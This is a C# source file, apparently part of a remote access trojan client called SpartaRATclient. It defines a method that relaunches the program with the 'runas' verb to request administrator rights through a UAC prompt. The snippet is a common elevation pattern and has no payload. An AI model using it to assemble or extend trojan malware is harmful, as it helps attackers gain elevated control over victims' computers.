using Microsoft.Win32;
using SpartaRATclient.Setup.OSType;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SpartaRATclient.Setup.PrivilegeCheck
{
    public class AdminGet
    {
        public bool GetAdmin()
        {
            ProcessStartInfo p = new ProcessStartInfo();
            p.UseShellExecute = true;
            p.WorkingDirectory = Environment.CurrentDirectory;
            p.FileName = Assembly.GetEntryAssembly().CodeBase;
            p.Verb = "runas";

            try
            {
                Process.Start(p);
                return true;
            }
            catch
            {
                return false;
            }
        }
    }
}
